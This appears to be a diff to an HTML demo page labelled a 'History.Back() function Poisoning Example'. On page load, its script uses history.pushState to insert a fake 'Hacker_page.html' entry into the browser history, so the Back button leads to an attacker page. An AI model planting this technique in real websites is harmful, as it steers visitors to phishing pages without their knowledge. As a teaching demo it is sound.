@@ -6,12 +6,11 @@
 </head>
 
 <body>
-    <!--<a onclick="exploit()" href="example_of_vuln.html">Continue...</a>-->
+    <h1> This is <p style=color:red>History.Back()</p> function Poisoning Example</h1>
+    <a onclick="exploit()" href="example_of_vuln.html">Continue...</a>
     <script type="text/javascript">
         function exploit() {
-            history.pushState({ page: 1 }, "Exploit", "Hacker_page.html");
-            window.location.replace("example_of_vuln.html");
-            
+            history.pushState({ page: 1 }, "Exploit", "Hacker_page.html");    
         }
        exploit(); 
     </script>
